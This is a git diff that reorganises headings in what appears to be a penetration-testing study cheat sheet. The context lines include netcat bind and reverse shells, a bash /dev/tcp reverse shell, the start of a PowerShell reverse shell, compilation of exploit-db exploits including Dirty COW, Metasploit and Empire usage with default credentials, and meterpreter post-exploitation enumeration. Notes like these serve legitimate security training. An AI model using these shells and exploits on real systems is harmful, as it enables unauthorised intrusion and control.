@@ -53,6 +53,7 @@ Change ip_addr and local_port accordingly for nc listener
 python 39161.py <ip> <port>
 ```
 
+#### Windows Cross-Compilation Example
 ```
 sudo apt-get install mingw-w64 gcc
 
@@ -72,9 +73,9 @@ i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
 file exploit_32.exe 
 exploit_32.exe: PE32 executable (console) Intel 80386, for MS Windows, 17 sections
 ```
-- Windows cross-compilation example (https://www.exploit-db.com/exploits/9303)
-  - Use 32-bit if unsure of target's architecture.
+- Use 32-bit if unsure of target's architecture.
 
+#### Linux Compilation Example
 ```
 searchsploit -m 40839
 
@@ -84,10 +85,10 @@ gcc -pthread 40839.c -o dirty -lcrypt
 file dirty         
 dirty: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=831f9c59a2d3c829841c3f34979bd09c94104b21, for GNU/Linux 3.2.0, not stripped
 ```  
-- Linux compilation example
-  - Specific compilation instructions given
+- Specific compilation instructions given
 
-- https://github.com/offensive-security/exploitdb-bin-sploits
+#### Useful Links
+- https://gitlab.com/exploit-database/exploitdb-bin-sploits
 
 ### Bind and Reverse Shells
 ```
@@ -118,12 +119,13 @@ nc -nvlup <port>
 nc -nvu <ip> <port>
 ```
 
+#### Transferring Files
 ```
 nc -nvlp <port> > received.txt
 nc -nv <ip> <port> < sent.txt
 ```
-- Transferring files.
 
+#### Bind Shells
 ```
 nc -nvlp <port> -e /bin/bash
 nc -nv <ip> <port>
@@ -132,8 +134,8 @@ nc -nv <ip> <port>
 nc -nvlp <port> -e cmd.exe
 nc -nv <ip> <port>
 ```
-- Bind shells.
 
+#### Reverse Shells
 ```
 nc -nvlp <port>
 nc -nv <ip> <port> -e /bin/bash
@@ -142,8 +144,8 @@ nc -nv <ip> <port> -e /bin/bash
 nc -nvlp <port>
 nc -nv <ip> <port> -e cmd.exe
 ```
-- Reverse shells.
 
+#### Useful Links
 - https://github.com/swisskyrepo/PayloadsAllTheThings
 - https://www.revshells.com/
 
@@ -152,6 +154,7 @@ bash -i >& /dev/tcp/<ip>/<port> 0>&1
 ```
 
 ### Exploitation Frameworks
+#### MSF
 ```
 nmap -Pn -sV <ip>
 
@@ -163,6 +166,7 @@ use exploit/multi/http/processmaker_exec
 ```
 - Both modules require credentials - default credentials are `admin / admin`.
 
+#### PowerShell-Empire (Empire)
 ```
 sudo apt-get update && sudo apt-get install powershell-empire starkiller -y
 
@@ -175,10 +179,7 @@ agents
 https://localhost:1337
 empireadmin / password123
 ```
-- PowerShell-Empire (Empire)
-  - Exploitation + Post-Exploitation
-  - Primarily limited to Windows targets.
-  - https://www.kali.org/blog/empire-starkiller/ (GUI)
+- https://www.kali.org/blog/empire-starkiller/ (Web GUI)
 
 ### Windows Exploitation
 
@@ -255,6 +256,7 @@ Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('10.0.
 
 ## Post-Exploitation
 ### Windows Local Enumeration
+#### Enumerating System Information
 ```
 meterpreter > sysinfo
 
@@ -263,8 +265,8 @@ systeminfo
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 dir /b/s eula.txt
 ```
-- Enumerating System Information
 
+#### Enumerating Users & Groups
 ```
 meterpreter > getuid
 meterpreter > getprivs
@@ -281,8 +283,8 @@ net localgroup Administrators
 use post/windows/gather/enum_logged_on_users
 set SESSION <session_id>
 ```
-- Enumerating Users & Groups
 
+#### Enumerating Network Information
 ```
 ipconfig
 ipconfig /all
@@ -292,9 +294,9 @@ netstat -ano
 netsh firewall show state
 netsh advfirewall show allprofiles
 ```
-- Enumerating Network Information
-  - Take note of APIPA addresses (`169.254.0.0/16`) in `arp -a` output
+- Take note of APIPA addresses (`169.254.0.0/16`) in `arp -a` output
 
+#### Enumerating Processes & Services
 ```
 meterpreter > ps
 meterpreter > ps -S <process_name>
@@ -311,8 +313,8 @@ exit
 
 meterpreter > download C:\\Temp\\schtasks.txt
 ```
-- Enumerating Processes & Services
 
+#### Automating Windows Local Enumeration
 ```
 meterpreter > show_mount
 
@@ -326,9 +328,9 @@ use post/windows/gather/checkvm
 
 cat /root/.msf4/loot/<filename>.txt
 ```
-- Automating Windows Local Enumeration
-	- Post-exploitation modules need to `set SESSION <session_id>`
+- Post-exploitation modules need to `set SESSION <session_id>`
 
+#### JAWS - Just Another Windows Script
 ```
 meterpreter > mkdir C:\\Temp
 meterpreter > cd C:\\Temp
@@ -340,7 +342,7 @@ exit
 
 meterpreter > download C:\\Temp\\jaws-enum.txt
 ```
-- JAWS - Just Another Windows Script (https://github.com/411Hall/JAWS)
+- https://github.com/411Hall/JAWS
 
 ### Linux Local Enumeration
 ```
